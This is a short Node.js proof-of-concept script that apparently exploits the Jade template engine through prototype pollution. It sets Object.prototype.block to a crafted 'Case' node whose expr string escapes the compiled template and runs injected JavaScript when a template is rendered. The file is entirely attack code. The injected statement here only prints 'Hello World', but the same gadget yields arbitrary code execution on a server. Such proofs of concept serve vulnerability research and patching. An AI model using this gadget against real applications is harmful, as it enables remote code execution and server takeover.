var jade = require('jade');
const path = require('path');
const templatePath = path.join(__dirname+'/views/', 'attrs.jade');

Object.prototype.self = 1;
Object.prototype.block = {
    type: 'Case',
    expr: 'self){}\nconsole.log("Hello World");{//',    
    // helper property
    block: {
        type: 'Literal',
        str: ''
    }
}

jade.renderFile(templatePath);